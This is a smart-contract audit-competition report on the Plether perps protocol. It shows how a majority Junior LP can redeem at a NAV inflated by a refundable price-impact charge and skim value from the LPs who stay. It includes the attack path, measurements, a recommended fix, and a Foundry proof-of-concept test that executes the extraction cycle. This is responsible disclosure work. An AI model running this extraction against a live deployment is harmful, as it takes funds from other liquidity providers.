# \#99588 [SC-Critical] Plether: a positive VPI charge is booked as LP revenue but never reserved against its own refund, so a majority Junior LP can redeem at the inflated NAV and skim it from the LPs who stay

**Submitted on Nov 14th 2026 at 11:51:35 UTC by @SombraX for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99588
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Contract fails to deliver promised returns, but doesn't lose value

## Description

# A positive VPI charge is booked as LP revenue but never reserved against its own refund

**Severity:** Low (see severity note: Medium "Griefing" or High "Theft of unclaimed yield" may fit better)

**Impact:** Contract fails to deliver promised returns, but doesn't lose value (see severity note)

**Asset:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src (`CfdEngineSettlementSidecar.sol`, `HousePool.sol`, `HousePoolAccountingLib.sol`, `CfdEnginePlanLib.sol`)

**Pin:** `a82d4fefb02768e5b3bddcc97dee371eee24fea8`

## Severity note

Filed as Low because no protocol principal and no trader collateral is taken; the value moves from one group of LPs (those who stay) to another (a redeeming majority LP). Two other rows of the program's impact table describe the same behaviour: Medium "Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)" and High "Theft of unclaimed yield", since the price-impact charge is LP revenue and a Junior LP that owns a majority of the tranche takes part of it from the LPs who keep their capital in the pool. Unlike pure griefing, the actor profits. We leave the final level to triage.

## What is and is not claimed

Claimed: a positive VPI (price-impact) charge `V` paid by a trader on a skew-**increasing** open is added to the pool's accounted assets immediately as LP revenue, and the LP NAV used to price asynchronous redemptions contains no offsetting term for the fact that the same `V` is refundable to the trader at close through the lifetime VPI clamp. An actor who is both the opening trader and a **majority** Junior LP can request a redemption, open the position, let the LP epoch settle (through the public `settleLpEpoch`), claim the redemption at the `V`-inflated NAV, then close and have `V` refunded from the pool. The staying Junior LPs fund both the skim and, separately, the protocol's open fee. The net is positive for the actor above roughly 40% of Junior.

Not claimed: theft of protocol principal or of any trader's collateral; a freeze. Below ~40% of Junior the round-trip is a net loss to the actor (its own pro-rata share of `V` plus fees exceeds the skim).

## Summary

On a skew-increasing open the settlement path books the positive VPI charge straight into the pool's accounted assets as revenue. The LP NAV / reconcile snapshot that prices async deposits and redemptions is physical assets minus trader claims plus the marked price delta — it has no term for outstanding **refundable positive VPI**. But at close, the engine refunds the charge (clamped to the lifetime VPI accrued) out of pool cash. So between the open and the close the pool's redeemable NAV is overstated by the outstanding `V`. A majority Junior LP redeems inside that window and is paid a share of `V`; when the trader (the same actor) closes, the refund is drawn from the LPs who did not redeem.

The design already excludes the **negative**-VPI reserve from marked LP equity "so LPs cannot withdraw it as marked equity" (WHITEPAPER 5.1). The **positive** direction is the mirror image and is not excluded: here LPs *can* withdraw a charge that will be refunded.

## Root cause

- `CfdEngineSettlementSidecar.sol:446-463` (open settlement): the positive VPI charge is routed to `HousePool.recordClaimantInflow(... Revenue ...)`.
- `HousePool.sol:624-651` (`recordClaimantInflow`): adds the amount to `accountedAssets` with no reserve on the refundable portion.
- `HousePoolAccountingLib.sol:61-79` (NAV / reconcile snapshot): physical − trader claims ± price delta; no term for outstanding refundable positive VPI.
- `CfdEnginePlanLib.sol:970-978` and `CloseAccountingLib.sol:104-120` (close): the close rebate is clamped to exactly the lifetime VPI and paid from pool cash above trader claims.
- Contrast `WHITEPAPER.md:5.1`: the negative-VPI reserve is kept out of marked LP equity. The positive side has no equivalent exclusion.

## Path

Actor A is a Junior LP owning a majority of the tranche and controls a trader account.

1. A requests redemption of its Junior stake before the epoch cutoff.
2. A opens a max-skew position (notional ≈ 0.4 × depth). The price-impact charge `V` is booked into pool NAV as LP revenue.
3. Anyone calls the permissionless `OrderRouter.settleLpEpoch(pyth)`. A's redemption is priced at NAV, which now includes `V`.
4. A claims the redemption at the inflated price, then closes the position; `V` is refunded from pool cash.
5. A re-deposits and repeats. Each cycle the staying Junior LP's share value falls.

No step of this path requires a privileged role; step 3 is the production settlement entrypoint called by an ordinary account. In the test, pool funding, the control run's settlement and the re-deposit between cycles use the repository's own test helpers; the open, the settlement that prices the redemption, the claim and the close of the attack run go through the Router and the vault.

The position has to be open only at the moment of step 3, so the open can be sent just before the epoch settles and the close just after the claim. The test holds the price at 1.00 throughout; the actor's price exposure during that window is ordinary directional risk with no expected sign and is not part of the measurement.

## Measurements

Release risk parameters. Pool: Senior 20M, innocent Junior LP 10M, attacker Junior 20M (depth ≈ 50M). Trade: LONG, notional 20M = 0.4 × depth, fully self-funded. Amounts are 6-decimal assets; divide by 1e6 for USD.

| Quantity | Value |
|---|---|
| `V` booked into pool NAV on open | 39,998.40 (~8 bps of depth) |
| Treasury open fee (4 bps of 20M) | 8,000.00 |
| Treasury close delta | 0.00 (close exec fee stays in the pool on a net-rebate close) |
| Reachable redemption | 99.99% of the request — not gated while the 0.4×-depth position is open |
| Trader-leg round-trip cost (open + close) | 16,041.67 = two 8,000.00 execution fees + 41.67 |
| Attacker net, attack run | +10,379.46 |
| Attacker net, control run (no trade) | −243.54 |
| Attacker gain from attacking | +10,623.00 |
| Victim (staying LP) loss | +18,621.44 |

Conservation: attacker gain (10,623) + treasury open fee (8,000) ≈ victim loss (18,621). The staying Junior LP funds both the skim and the protocol's open fee.

The trader leg shows where the gain does not come from. Apart from the two execution fees it cost 41.67, so the close returned at most the 39,998.40 charge paid at open and no more. The rebate is not amplified by the lower pool depth after the redemption; the lifetime clamp holds it to the charge paid. The whole gain arises earlier, when the redemption is priced with `V` inside NAV.

Repeatability: the staying victim's share value falls 10,000,000.00 → 9,981,256.78 → 9,962,307.01 over two cycles (~18.7k then ~18.9k lost). The test runs two cycles; each needs one deposit activation, the one-hour deposit cooldown and one redemption epoch. We did not measure a daily rate.

Below threshold (attacker Junior 10M of 50M, f ≈ 0.2): attacker gain **−11,256.22** — the actor loses. Break-even is ~40% of Junior, and the Junior/Senior 80/20 covenant must allow the exit. Whale-only.

## Impact

- A Junior LP that owns a majority of the tranche can, by opening and closing its own max-skew position around its own redemption, take value from the LPs who keep their capital in the pool, repeatably. Measured at ~$10.6k per cycle to the attacker and ~$18.6k per cycle away from a single $10M staying LP (0.19% of that LP's stake per cycle), with ~$22M of the actor's capital in use.
- The same mispricing applies to any redemption priced while another trader's positive VPI is outstanding: the redeeming LP is paid a share of a charge that the remaining LPs later refund. We did not test that passive case; the measured case is the self-dealing one above.
- No protocol principal and no trader collateral is taken; the loss is confined to other Junior LPs' yield.

## Why this is not intended and not a known issue

- The design explicitly excludes the **negative**-VPI reserve from marked LP equity (`WHITEPAPER.md:5.1`) so LPs cannot withdraw it; the **positive** refundable charge is the mirror case and is not excluded. The asymmetry is the bug.
- `VpiDepth.t.sol` and `VpiRoundTripAccounting.t.sol` only assert the **trader** does not profit from a VPI round-trip; neither asserts LP share price around one. The majority-LP vector is uncovered by the suite.
- The code treats an LP acting around its own trade as an attack to be prevented, not as accepted economics. `CloseAccountingLib.sol:112-115`: the lifetime clamp "Prevents LP sandwich attacks where an attacker opens at high depth, reduces pool depth, then closes to extract a net-negative lifetime VPI rebate." `SECURITY.md:1443`: "the lifetime clamp intentionally zeroes otherwise extractable rebate-only round trips". The clamp protects the trader leg only. It does nothing about the LP leg, which is where the value leaves in this report.
- Not in the Cecuro report, the SC Audit Studio pre-audit, the 15 Oct AI scan, or the listed `SECURITY.md` known-limitation sections.
- Nearest known item: the 15 Oct scan's "Temporary pool-liquidity reduction can amplify a skew-reducing close rebate" (info). That item is about the depth used at close: lowering depth enlarges the fresh rebate, up to the clamp. This report does not depend on that. The measured trader leg received back no more than the charge it paid (see Measurements), which is the same refund it would be entitled to at unchanged depth. The loss to the staying LPs is created when the redemption is priced with the refundable charge inside NAV (`HousePoolAccountingLib.sol:61-79`), a step the scan item does not mention and the clamp does not touch. A fix for the scan item (for example a time-weighted depth) would leave this open.
- On the size of the actor: the path needs a holder of more than about 40% of the Junior tranche, which is one LP position, not control of governance or of a majority of anything the protocol trusts. Every call is an ordinary deposit, redemption, open or close by an unprivileged account, and the mispricing it uses (a refundable charge counted as distributable equity) exists for a redeemer of any size.

## Recommended fix

Exclude outstanding refundable positive VPI from the distributable value used to price async redemptions, mirroring the negative-VPI reserve exclusion already applied in the other direction: track the aggregate refundable positive `vpiAccrued` across open positions and subtract it in the reconcile/NAV snapshot (`HousePoolAccountingLib`), so a redemption cannot be priced against a charge that will be refunded. Alternatively, book the positive VPI into a reserve bucket that is released to LP revenue only when the position closes and the refund window has passed.



## Link to Proof of Concept

https://gist.github.com/dexloom/ee1f7cf01728ea37e655aa346a1c5e24

## Proof of Concept

## Proof of concept

Secret gist with README and test: https://gist.github.com/dexloom/ee1f7cf01728ea37e655aa346a1c5e24

```
git clone --recurse-submodules https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout --detach a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
# save the test below as:
#   packages/perps/test/perps/accounting/fees/R2DVpiMajorityLpExtraction.t.sol
cd packages/perps
forge test --match-path 'test/perps/accounting/fees/R2DVpiMajorityLpExtraction.t.sol' -vv
```

Output at the pin (6-decimal assets; divide by 1e6 for USD):

```
[PASS] test_MajorityLp_VpiExtraction_vs_control()
  === run: ATTACK (majority, with trade)
    V (pool delta on open): 39998400063
    claimed redeem assets:  20026421136060
    treasury open fee:      8000000000
    treasury close delta:   0
    victim share value:     9981256777485
  === run: CONTROL (majority, no trade)
    V (pool delta on open): 0
    claimed redeem assets:  19999756458651
    victim share value:     9999878220194
  attacker NET (attack run):                   10379462010
  attacker NET (control run):                  -243541349
  attacker gain from attacking (attack - control): 10623003359
  victim loss from attack (control - attack):  18621442709
  reachable redemption bps of request:         9999
  trader-leg round-trip cost (2 exec fees + V - refund + carry): 16041674050
[PASS] test_MajorityLp_Repeatable_TwoCycles()
  victim value start:          9999999987825
  victim value after cycle 1:  9981256777485
  victim value after cycle 2:  9962307008966
  victim loss cycle 1:         18743210340
  victim loss cycle 2:         18949768519
[PASS] test_MinorityLp_VpiExtraction_IsNotProfitable()
  minority attacker gain from attacking: -11256223883
Suite result: ok. 3 passed; 0 failed; 0 skipped
```

Test:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// Candidate R2-D: a positive VPI (price-impact) charge booked as LP revenue at open is NOT reserved against the
// refund it earns at close via the lifetime clamp. A large Junior LP who redeems BETWEEN the open and the close
// is funded at a NAV inflated by V and walks away with a share of V; the later close refund is borne by the LPs
// who stayed. This test reproduces the MAJORITY-Junior-LP case (the suite's existing VpiDepth tests cover only
// the trader-only / minority case) and a below-threshold case that should NOT be profitable.
//
// Release parameters (DEPLOYMENT.md): vpiFactor 0.01e18, maxSkew 0.4e18, init 20 bps, maint 10 bps,
// exec fee 4 bps (engine default), buffer 25 bps (engine default), base carry 500 bps, LP epoch 1h.

import {BasePerpTest} from "../../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract R2DVpiMajorityLpExtractionTest is BasePerpTest {

    address internal seniorLp = address(0x5E0001);
    address internal victim = address(0x711C01); // innocent Junior LP that stays
    address internal attacker = address(0xA77ACC); // Junior LP AND trader (same actor)
    address internal keeper = address(0xCEE9E5); // unprivileged settler

    uint256 internal constant M = 1e6; // asset (6-decimal) unit scale

    struct CycleResult {
        uint256 vPoolDelta; // pool totalAssets increase on open (== booked V)
        uint256 requestedRedeemShares;
        uint256 claimedRedeemAssets;
        uint256 fullRedeemEstimateAssets; // value of the requested shares at inflated NAV
        uint256 treasuryOpenFee;
        uint256 treasuryCloseDelta;
        uint256 attackerWallet; // settlement token in attacker wallet (includes claimed redemption)
        uint256 attackerClearinghouse; // trader free+locked settlement balance
        uint256 attackerRemainingShareValue; // convertToAssets(remaining junior shares)
        uint256 victimShareValue; // convertToAssets(victim junior shares)
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1 * 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    // -----------------------------------------------------------------
    // Pool setup and single-cycle attack
    // -----------------------------------------------------------------

    /// @dev Junior is funded first: the senior deposit cap is bounded by the junior principal (80/20 covenant).
    function _setupPool(
        uint256 seniorAmt,
        uint256 victimAmt,
        uint256 attackerAmt
    ) internal {
        _fundJunior(victim, victimAmt);
        _fundJunior(attacker, attackerAmt);
        if (seniorAmt > 0) {
            _fundSenior(seniorLp, seniorAmt);
        }
    }

    /// @dev Re-deposits assets the attacker already holds in its wallet into the Junior tranche (no fresh mint),
    ///      settling the deposit epoch so the shares mint. Used for repeatability across cycles.
    function _depositJuniorFromWallet(
        address lp,
        uint256 amount
    ) internal {
        vm.startPrank(lp);
        IERC20(address(settlementToken)).approve(address(juniorVault), amount);
        uint256 requestId = juniorVault.requestDeposit(amount, lp, lp);
        vm.stopPrank();

        uint256 activationTime = juniorVault.depositEpochStart(requestId);
        if (block.timestamp < activationTime) {
            vm.warp(activationTime);
        }
        uint256 markPrice = engine.lastMarkPrice();
        vm.prank(address(router));
        engine.updateMarkPrice(markPrice == 0 ? 1e8 : markPrice, uint64(block.timestamp));
        _settleLpEpochForTest();

        uint256 claimableAssets = juniorVault.claimableDepositRequest(requestId, lp);
        vm.prank(lp);
        juniorVault.claimDeposit(requestId, claimableAssets, lp, lp);
    }

    /// @dev One open->settle->claim->close cycle against an already-funded pool. `doTrade=false` is the CONTROL
    ///      run (redeem priced with no VPI lift). Settlement in the attack run is driven through the production
    ///      permissionless `OrderRouter.settleLpEpoch` from an unprivileged keeper EOA.
    function _attackCycle(
        uint256 traderFund,
        uint256 openSizeE18,
        bool doTrade
    ) internal returns (CycleResult memory r) {
        uint256 treasuryBefore = clearinghouse.balanceAssets(engine.protocolTreasury());

        // Clear the 1h deposit cooldown for the attacker's redeem request.
        vm.warp(block.timestamp + 1 hours + 1);

        // Step 1: attacker (LP) requests redemption of its full Junior stake before the cutoff.
        uint256 redeemShares = juniorVault.maxRequestRedeem(attacker);
        r.requestedRedeemShares = redeemShares;
        vm.prank(attacker);
        uint256 requestId = juniorVault.requestRedeem(redeemShares, attacker, attacker);

        // Step 2: attacker (trader) opens a max-skew position; V is booked as LP revenue into pool NAV.
        if (doTrade) {
            _fundTrader(attacker, traderFund);
            uint256 poolBefore = pool.totalAssets();
            vm.prank(attacker);
            router.commitOrder(CfdTypes.Side.LONG, openSizeE18, traderFund / 2, 1e8, false);
            router.executeOrder(router.nextExecuteId(), _mockPythUpdateData(1e8));
            r.vPoolDelta = pool.totalAssets() - poolBefore;
            r.treasuryOpenFee = clearinghouse.balanceAssets(engine.protocolTreasury()) - treasuryBefore;
        }

        // Step 3: settle the LP epoch so the redemption is priced at NAV (which now includes V while open).
        vm.warp(pool.lpEpochStart(requestId));
        uint256 treasuryBeforeClose;
        if (doTrade) {
            vm.prank(keeper);
            router.settleLpEpoch(_mockPythUpdateData(1e8)); // production permissionless path, unprivileged caller
            treasuryBeforeClose = clearinghouse.balanceAssets(engine.protocolTreasury());
        } else {
            _settleLpEpochForTest();
        }

        // Step 4: attacker claims the (inflated) redemption, then closes the position (V refunded from the pool).
        r.fullRedeemEstimateAssets = juniorVault.estimateRedeemAssets(redeemShares);
        uint256 claimableShares = juniorVault.claimableRedeemRequest(requestId, attacker);
        if (claimableShares > 0) {
            vm.prank(attacker);
            r.claimedRedeemAssets = juniorVault.claimRedeem(requestId, claimableShares, attacker, attacker);
        }

        if (doTrade) {
            vm.prank(attacker);
            router.commitOrder(CfdTypes.Side.LONG, openSizeE18, 0, 0, true);
            router.executeOrder(router.nextExecuteId(), _mockPythUpdateData(1e8));
            r.treasuryCloseDelta = clearinghouse.balanceAssets(engine.protocolTreasury()) - treasuryBeforeClose;
        }

        // Measurement. convertToAssets() live-reconciles the pool, so remaining shares already reflect the
        // post-close NAV (V has left the pool) without needing a further settle.
        r.attackerWallet = settlementToken.balanceOf(attacker);
        r.attackerClearinghouse = clearinghouse.balanceAssets(attacker);
        r.attackerRemainingShareValue = juniorVault.convertToAssets(juniorVault.balanceOf(attacker));
        r.victimShareValue = juniorVault.convertToAssets(juniorVault.balanceOf(victim));
    }

    // -----------------------------------------------------------------
    // Net helpers
    // -----------------------------------------------------------------

    /// @dev Attacker realizable value minus what the attack cost it this cycle (trade fees are included because
    ///      the trader's clearinghouse balance already reflects them). `invested` is the capital at risk this
    ///      cycle: the Junior stake redeemed plus the trader funding (only in the attack run).
    function _attackerNet(
        CycleResult memory r,
        uint256 juniorStake,
        uint256 traderFund,
        bool doTrade
    ) internal pure returns (int256) {
        uint256 realizable = r.attackerWallet + r.attackerClearinghouse + r.attackerRemainingShareValue;
        uint256 invested = juniorStake + (doTrade ? traderFund : 0);
        return int256(realizable) - int256(invested);
    }

    function _logCycle(
        string memory tag,
        CycleResult memory r
    ) internal {
        emit log_named_string("=== run", tag);
        emit log_named_uint("  V (pool delta on open)", r.vPoolDelta);
        emit log_named_uint("  requested redeem shares", r.requestedRedeemShares);
        emit log_named_uint("  claimed redeem assets", r.claimedRedeemAssets);
        emit log_named_uint("  full redeem estimate (inflated NAV)", r.fullRedeemEstimateAssets);
        emit log_named_uint("  treasury open fee", r.treasuryOpenFee);
        emit log_named_uint("  treasury close delta", r.treasuryCloseDelta);
        emit log_named_uint("  attacker wallet (incl claimed)", r.attackerWallet);
        emit log_named_uint("  attacker clearinghouse", r.attackerClearinghouse);
        emit log_named_uint("  attacker remaining share value", r.attackerRemainingShareValue);
        emit log_named_uint("  victim share value", r.victimShareValue);
    }

    // -----------------------------------------------------------------
    // MAJORITY attacker (f ~= 0.667 of Junior): confirm or refute the finding vs a control.
    // -----------------------------------------------------------------

    function test_MajorityLp_VpiExtraction_vs_control() public {
        uint256 seniorAmt = 20_000_000 * M;
        uint256 victimAmt = 10_000_000 * M;
        uint256 attackerAmt = 20_000_000 * M;
        uint256 traderFund = 2_000_000 * M;
        // depth ~= 50M, max-skew notional = 0.4 * 50M = 20M -> size 20_000_000e18 at price 1.0
        uint256 openSizeE18 = 20_000_000 * 1e18;

        uint256 snap = vm.snapshotState();

        _setupPool(seniorAmt, victimAmt, attackerAmt);
        CycleResult memory attack = _attackCycle(traderFund, openSizeE18, true);
        int256 attackerNetAttack = _attackerNet(attack, attackerAmt, traderFund, true);

        vm.revertToState(snap);

        _setupPool(seniorAmt, victimAmt, attackerAmt);
        CycleResult memory control = _attackCycle(traderFund, openSizeE18, false);
        int256 attackerNetControl = _attackerNet(control, attackerAmt, traderFund, false);

        _logCycle("ATTACK (majority, with trade)", attack);
        _logCycle("CONTROL (majority, no trade)", control);

        int256 victimLoss = int256(control.victimShareValue) - int256(attack.victimShareValue);
        int256 attackerGain = attackerNetAttack - attackerNetControl;

        emit log_named_int("attacker NET (attack run)", attackerNetAttack);
        emit log_named_int("attacker NET (control run)", attackerNetControl);
        emit log_named_int("attacker gain from attacking (attack - control)", attackerGain);
        emit log_named_int("victim loss from attack (control - attack)", victimLoss);
        emit log_named_uint(
            "reachable redemption bps of request",
            attack.fullRedeemEstimateAssets == 0
                ? 0
                : (attack.claimedRedeemAssets * 10_000) / attack.fullRedeemEstimateAssets
        );

        // The booked V must have landed in pool NAV as LP revenue (the mechanism's root).
        assertGt(attack.vPoolDelta, 0, "positive VPI must be booked into pool NAV on a skew-increasing open");

        // The trader leg alone: what the open + close cost the attacker's trading account. It is the two execution
        // fees plus (V - refund) plus carry, so a value at or above two execution fees means the close refunded
        // no more than the V that was paid: the gain does not come from an amplified rebate.
        uint256 traderRoundTripCost = traderFund - attack.attackerClearinghouse;
        emit log_named_uint("trader-leg round-trip cost (2 exec fees + V - refund + carry)", traderRoundTripCost);
        assertGe(traderRoundTripCost, 2 * attack.treasuryOpenFee, "close refund must not exceed the V paid at open");

        // The majority LP ends ahead of the honest control, and the LP that stayed ends behind it.
        assertGt(attackerGain, 0, "majority attacker nets positive by the VPI round-trip");
        assertGt(victimLoss, 0, "staying victim LP loses value to the attack");
    }

    // -----------------------------------------------------------------
    // Repeatability: run two attack cycles on one pool and show the direction of the victim's value each time.
    // -----------------------------------------------------------------

    function test_MajorityLp_Repeatable_TwoCycles() public {
        uint256 seniorAmt = 20_000_000 * M;
        uint256 victimAmt = 10_000_000 * M;
        uint256 attackerAmt = 20_000_000 * M;
        uint256 traderFund = 2_000_000 * M;
        uint256 openSizeE18 = 20_000_000 * 1e18;

        _setupPool(seniorAmt, victimAmt, attackerAmt);

        uint256 victimStart = juniorVault.convertToAssets(juniorVault.balanceOf(victim));

        CycleResult memory c1 = _attackCycle(traderFund, openSizeE18, true);
        _logCycle("ATTACK cycle 1", c1);
        emit log_named_int("cycle 1 attacker NET", _attackerNet(c1, attackerAmt, traderFund, true));

        // Re-deposit the attacker's redeemed assets back into Junior from its own wallet (no fresh mint), then repeat.
        uint256 redeposit = settlementToken.balanceOf(attacker);
        assertGt(redeposit, 0, "attacker must hold redeemed assets to recycle");
        _depositJuniorFromWallet(attacker, redeposit);

        CycleResult memory c2 = _attackCycle(traderFund, openSizeE18, true);
        _logCycle("ATTACK cycle 2", c2);

        emit log_named_uint("victim value start", victimStart);
        emit log_named_uint("victim value after cycle 1", c1.victimShareValue);
        emit log_named_uint("victim value after cycle 2", c2.victimShareValue);
        emit log_named_uint("victim loss cycle 1", victimStart - c1.victimShareValue);
        emit log_named_uint("victim loss cycle 2", c1.victimShareValue - c2.victimShareValue);

        // The attack is repeatable: V is booked both cycles and the staying victim LP keeps losing value each cycle.
        assertGt(c1.vPoolDelta, 0, "cycle 1 booked V");
        assertGt(c2.vPoolDelta, 0, "cycle 2 booked V (repeatable)");
        assertLt(c1.victimShareValue, victimStart, "cycle 1: victim loses value");
        assertLt(c2.victimShareValue, c1.victimShareValue, "cycle 2: victim loses further value (repeatable drain)");
    }

    // -----------------------------------------------------------------
    // BELOW-THRESHOLD attacker (f ~= 0.2 of Junior): expected to LOSE.
    // -----------------------------------------------------------------

    function test_MinorityLp_VpiExtraction_IsNotProfitable() public {
        uint256 seniorAmt = 20_000_000 * M;
        uint256 victimAmt = 40_000_000 * M;
        uint256 attackerAmt = 10_000_000 * M;
        uint256 traderFund = 4_000_000 * M;
        // depth ~= 70M, max-skew notional = 0.4 * 70M = 28M -> size 28_000_000e18
        uint256 openSizeE18 = 28_000_000 * 1e18;

        uint256 snap = vm.snapshotState();

        _setupPool(seniorAmt, victimAmt, attackerAmt);
        CycleResult memory attack = _attackCycle(traderFund, openSizeE18, true);
        int256 attackerNetAttack = _attackerNet(attack, attackerAmt, traderFund, true);

        vm.revertToState(snap);

        _setupPool(seniorAmt, victimAmt, attackerAmt);
        CycleResult memory control = _attackCycle(traderFund, openSizeE18, false);
        int256 attackerNetControl = _attackerNet(control, attackerAmt, traderFund, false);

        _logCycle("ATTACK (minority, with trade)", attack);
        _logCycle("CONTROL (minority, no trade)", control);

        int256 attackerGain = attackerNetAttack - attackerNetControl;
        emit log_named_int("minority attacker gain from attacking", attackerGain);

        assertLe(attackerGain, 0, "below-threshold Junior share: the VPI round-trip must not be net profitable");
    }

}
```

